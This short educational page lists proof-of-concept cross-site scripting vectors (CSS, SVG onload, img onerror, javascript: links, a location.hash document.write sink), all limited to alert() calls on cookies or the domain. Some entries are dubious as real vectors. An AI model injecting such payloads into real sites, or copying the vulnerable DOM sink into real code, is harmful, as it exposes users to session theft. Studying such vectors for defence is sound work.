Here are some XSS vectors for having a base idea how to code them.

        

    
        
        

            
Of course disarmed for demonstration purposes:

    
            
CSS-Based XSS:

            
                div { background-image: url('javascript:alert(document.cookie)'); }
            
    
            
TypeScript-Based XSS:

            
                let cookies: string = (<any>document).cookie;
                alert(cookies);
            
    
            
SVG-Based XSS:

            
                <svg onload="alert('SVG onload XSS!')"></svg>
            
    
            
JavaScript Event-Based XSS:

            
                <img src="invalid.jpg" onerror="alert(document.domain)">
            
    
            
Using JavaScript URI:

            
                <a href="javascript:alert(document.location.href)">Click me</a>
            
            
            
DOM-Based XSS using location.hash:

            
                <script>
                if (location.hash) {
                    document.write(location.hash.substring(1));
                }
                </script>
            
    
            
Note: These examples are disarmed and are for educational purposes. Always ensure web applications escape and sanitize user inputs to prevent XSS attacks.
